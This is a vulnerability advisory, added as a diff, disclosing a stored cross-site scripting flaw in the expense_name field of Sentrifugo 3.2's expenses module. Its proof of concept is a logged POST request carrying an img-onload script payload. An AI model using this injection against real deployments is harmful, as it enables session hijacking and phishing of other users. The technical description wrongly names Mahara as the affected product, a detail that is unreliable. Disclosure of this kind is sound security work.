@@ -1,0 +1,148 @@
+# Exploit Title: Sentrifugo CMS 3.2 - Persistent Cross-Site Scripting
+# Dork: N/A
+# Date: 2020-05-06
+# Exploit Author: Vulnerability-Lab
+# Vendor: http://www.sentrifugo.com/
+# Link: http://www.sentrifugo.com/download
+# Version: 3.2
+# Category: Webapps
+# CVE: N/A
+
+Document Title:
+===============
+Sentrifugo v3.2 CMS - Persistent XSS Web Vulnerability
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2229
+
+
+Product & Service Introduction:
+===============================
+http://www.sentrifugo.com/
+http://www.sentrifugo.com/download
+
+
+Affected Product(s):
+====================
+Sentrifugo
+Product: Sentrifugo v3.2 - CMS (Web-Application)
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-05-05: Public Disclosure (Vulnerability Laboratory)
+
+
+Technical Details & Description:
+================================
+A persistent input validation web vulnerability has been discovered in
+the official Mahara v19.10.2 CMS web-application series.
+The vulnerability allows remote attackers to inject own malicious script
+codes with persistent attack vector to compromise browser
+to web-application requests from the application-side.
+
+The persistent vulnerability is located in the `expense_name` parameters
+of the `/expenses/expenses/edit` module in the `index.php` file.
+Remote attackers with low privileges are able to inject own malicious
+persistent script code as expenses entry. The injected code can
+be used to attack the frontend or backend of the web-application. The
+request method to inject is POST and the attack vector is located
+on the application-side. Entries of expenses can be reviewed in the
+backend by higher privileged accounts as well.
+
+Successful exploitation of the vulnerabilities results in session
+hijacking, persistent phishing attacks, persistent external redirects to
+malicious source and persistent manipulation of affected application
+modules.
+
+Request Method(s):
+[+] POST
+
+Vulnerable Module(s):
+[+] index.php/expenses/expenses/edit
+
+Vulnerable Input(s):
+[+] Expenses Name
+
+Vulnerable File(s):
+[+] index.php
+
+Vulnerable Parameter(s):
+[+] expense_name
+
+Affected Module(s):
+[+] index.php/expenses/expenses
+
+
+Proof of Concept (PoC):
+=======================
+The persistent web vulnerability can be exploited by low privileged web
+application user account with low user interaction.
+For security demonstration or to reproduce the vulnerability follow the
+provided information and steps below to continue.
+
+
+PoC: Vulnerable Source
+<div id="maincontentdiv">	
+<div id="dialog-confirm" style="display:none;">
+<div class="newframe-div">
+<div class="new-form-ui height32">
+<div class="division">
+<input type="text" maxlength="12" id="number_value"
+name="number_value"></div>
+<span class="errors"
+id="errors-contactnumber"></span></div></div></div>								
+<div id="empstatus-alert" style="display:none;">
+<div class="newframe-div"><div id="empstatusmessage"></div></div></div>
+<div id="empleaves-alert" style="display:none;">
+<div class="newframe-div"><div id="empleavesmessage"></div></div></div>	
+
+
+--- PoC Session Logs [POST] --- (Expenses Inject)
+http://sentrifugo.localhost:8080/index.php/expenses/expenses/edit
+Host: sentrifugo.localhost:8080
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 352
+Origin: http://sentrifugo.localhost:8080
+Connection: keep-alive
+Referer: http://sentrifugo.localhost:8080/index.php/expenses/expenses/edit
+Cookie: PHPSESSID=h67jk6dashpvgn5n3buc6uia87;
+_ga=GA1.2.788961556.1587849443; _gid=GA1.2.1158360779.1587849443
+id=&limit=&offset=&parameter=all&currencyid=1&file_original_names=&file_new_names=&last_inserted_receipts=&receiptId=&expense_Id=&
+expense_name=<img src="evil.source"
+onload=alert(document.domain)>&category_id=&project_id=&expense_date=&expense_currency_id=2&
+expense_amount=&cal_amount=0&is_from_advance=&expense_payment_id=&expense_payment_ref_no=&trip_id=&description=&post_receipt_ids=&submit=Save
+-
+POST: HTTP/1.1 200 OK
+Server: Apache/2.2.22 (Ubuntu)
+X-Powered-By: PHP/5.3.10-1ubuntu3.10
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 19284
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html
+
+
+Reference(s):
+http://sentrifugo.localhost:8080/index.php
+http://sentrifugo.localhost:8080/index.php/expenses
+http://sentrifugo.localhost:8080/index.php/expenses/expenses/
+http://sentrifugo.localhost:8080/index.php/expenses/expenses/edit
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+Benjamin Kunz Mejri -
+https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
+SERVICE: www.vulnerability-lab.com
